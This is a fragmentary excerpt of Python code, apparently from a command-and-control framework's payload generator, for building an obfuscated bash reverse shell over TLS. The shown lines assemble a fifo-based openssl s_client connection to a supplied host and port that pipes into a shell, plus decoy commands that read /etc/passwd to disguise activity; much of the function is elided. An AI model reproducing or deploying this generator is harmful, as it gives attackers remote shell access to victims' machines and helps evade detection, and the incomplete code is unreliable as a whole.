# Extracted from: C:\DEV\PyAgent\src\external_candidates\ingested\_0xsojalsec_gunnerc2.py\core.py\payload_generator.py\linux.py\tcp.py\bash_reverse_tcp_c7befcfff4c5.py
...
def generate_bash_reverse_tcp_obs3(ip, port, use_ssl):
    ...
    if use_ssl:
        ...
        parts.append(
            ...
            'decoy1=$(date +%s); decoy2=$((decoy1%7)); grep "" /etc/passwd >/dev/null 2>&1'
        )
        ...
        parts.append(
            ...
            'do_fifo(){ "$mk" "$fifo"; }; do_shell(){ "$o" s_client -quiet -connect "$d:$p" <"$fifo" | "$b" >"$fifo"; }'
        )
        ...
        parts.append('decoy1=$(date +%s); decoy2=$((decoy1%7)); grep "" /etc/passwd >/dev/null 2>&1')
